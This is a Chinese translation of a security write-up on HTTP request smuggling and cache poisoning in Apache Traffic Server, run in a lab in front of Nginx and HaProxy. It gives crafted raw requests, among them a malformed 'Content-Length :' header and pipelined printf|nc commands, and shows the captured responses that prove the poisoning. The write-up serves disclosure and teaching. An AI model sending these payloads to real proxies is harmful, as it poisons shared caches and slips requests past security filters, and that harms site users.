    $Nginx default static page
    Hello World
    It works!
### 使用不完整查询和错误的分隔符前缀的缓存
Cache poisoning听起来很棒。
在smuggling攻击中，我们只需要触发一个请求或响应拆分攻击即可证明缺陷，但是当将其推送到缓存时，人们通常会更好地理解拆分的管道为何很危险。
    HEADER[SPACE]:HEADER VALUE\r\n
> 每个标题字段均由不区分大小写的字段名，后跟冒号（“:”），可选的前导空格，字段值和可选的尾随空格组成。
ATS支持无效的标头语法：
    HEADER:HEADER_VALUE\r\n => OK
    HEADER:[SPACE]HEADER_VALUE\r\n => OK
    HEADER:[SPACE]HEADER_VALUE[SPACE]\r\n => OK
    HEADER[SPACE]:HEADER_VALUE\r\n => NOT OK
> 标头字段名称和冒号之间不允许有空格。 过去，此类空白在处理方面的差异已导致请求路由和响应处理中的安全漏洞。
> 服务器必须拒绝任何接收到的请求消息，该请求消息包含头域名和冒号之间的空格，响应码为400（错误请求）。
> 在向下转发消息之前，代理必须从响应消息中删除任何这样的空格。
ATS将解释错误的标头，并在不进行任何更改的情况下转发它。
使用此缺陷，我们可以在请求中添加一些标头，这些标头对于任何有效的HTTP代理都是无效的，但仍由ATS解释，例如：
`Content-Length :77\r\n`
`Transfer-encoding :chunked\r\n`
一些HTTP服务器将有效地拒绝此类消息，并显示错误400。但是某些HTTP服务器将仅忽略无效的标头。 例如Nginx就是这种情况。
ATS将保持与Nginx后端的保持活动连接，因此我们将使用此被忽略的标头来传输正文（ATS认为它是正文），实际上是对后端的新查询。
而且，我们将使此查询不完整（在标题末尾缺少crlf）以吸收将来发送给Nginx的查询。
这种由下一个查询填充的不完整查询也是13年前展示的一种基本Smuggling技术。
    01 GET /does-not-exists.html?cache=x HTTP/1.1\r\n
    02 Host: dummy-host7.example.com\r\n
    03 Cache-Control: max-age=200\r\n
    04 X-info: evil 1.5 query, bad CL header\r\n
    05 Content-Length :117\r\n
    06 \r\n
    07 GET /index.html?INJECTED=1 HTTP/1.1\r\n
    08 Host: dummy-host7.example.com\r\n
    09 X-info: evil poisoning query\r\n
    10 Dummy-incomplete:
第05行无效（':'）。 但是对于ATS来说是有效的。
第07/08/09/10行只是传输到后端的ATS的二进制主体数据。
对于Nginx：
  * 05行被忽略。
  * 第07行是一个新请求（并返回第一个响应）。
  * 第10行没有“ \ r \ n”。 因此Nginx仍在等待由ATS打开的保持活动连接上的查询结束。
### 攻击视图
    [ATS Cache poisoning - space before header separator + backend ignoring bad headers]
    Innocent        Attacker           ATS            Nginx
        |               |               |               |
        |               |--A(1A+1/2B)-->|               | * Issue 1 & 2 *
        |               |               |--A(1A+1/2B)-->| * Issue 3 *
        |               |               ||            [1/2B]
        |               |               |--C----------->| * ending B *
        |               |            [*CP*]|               |
        ||               |               |
        |               |--A----------->|               |
        |               |               |--A----------->|
        |               |            [cache]|               |               |
        |               |--A(+B)+C----->|               |
        |               |             [HIT]             | * Bug *
        |               ||
        |               |               ||
        |               |               | ATS-> Nginx。
    printf 'GET /index.html?cache=cogip2000 HTTP/1.1\r\n'\
    'Host: dummy-host7.example.com\r\n'\
    'Cache-control: max-age=300\r\n'\
    'Content-Length: 0\r\n'\
    '\r\n'\
    |nc -q 1 127.0.0.1 8001
您可以运行两次，然后再次看到它没有到达nginx access.log。
然后，我们攻击HaProxy或此HaProxy前面设置的任何其他缓存。 我们使用2条查询的管道，ATS将发送回3条响应。
如果在ATS前面存在保持活动模式，则存在安全问题。 出现这种情况是因为我们不使用选项：HaProxy上的http-close。
    printf 'GET /index.html?cache=cogip2000 HTTP/1.1\r\n'\
    'Host: dummy-host7.example.com\r\n'\
    'Cache-control: max-age=300\r\n'\
    'Content-Length: 74\r\n'\
    '\r\n'\
    'GET /index.html?evil=cogip2000 HTTP/1.1\r\n'\
    'Host: dummy-host7.example.com\r\n'\
    '\r\n'\
    'GET /victim.html?cache=zorglub HTTP/1.1\r\n'\
    'Host: dummy-host7.example.com\r\n'\
    '\r\n'\
    |nc -q 1 127.0.0.1 8001
查询/victim.html（在我们的示例中应为404）获取`/index.html (X-Location-echo:
/index.html?evil=cogip2000).`
    HTTP/1.1 200 OK
    Server: ATS/7.1.1
    Date: Fri, 26 Oct 2018 16:05:41 GMT
    Content-Type: text/html
    Content-Length: 120
    Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
    ETag: "5bd321bc-78"
    X-Location-echo: /index.html?cache=cogip2000
    X-Default-VH: 0
    Cache-Control: public, max-age=300
    Accept-Ranges: bytes
    Age: 12
    $Nginx default static page
    Hello World
    It works!
    HTTP/1.1 200 OK
    Server: ATS/7.1.1
    Date: Fri, 26 Oct 2018 16:05:53 GMT
    Content-Type: text/html
    Content-Length: 120
    Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
    ETag: "5bd321bc-78"
    X-Location-echo: /index.html?evil=cogip2000
    X-Default-VH: 0
    Cache-Control: public, max-age=300
    Accept-Ranges: bytes
    Age: 0
    $Nginx default static page
    Hello World
    It works!
这里的问题很关键，特别是因为攻击查询中没有无效的语法。
我们有一个HTTP响应拆分，这意味着两个主要影响：  
查询是隐藏，因此在ATS前面设置的任何安全过滤器都不能阻止第二个查询。 我们可以使用它来隐藏第二层攻击，例如其他攻击中所述的ATS缓存中毒。
现在已经有了一个工作实验室，可以尝试嵌入多层攻击...
为了更好地了解现实世界的影响，攻击者是唯一收到响应B而不是C的人。
HaProxy不是缓存，因此HaProxy上的`C-request/B-response`混合并不是真正的直接威胁。
但是，如果HaProxy前面有一个缓存，或者我们使用了多个链接的ATS代理。
    本文为翻译文章，来自：[https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/]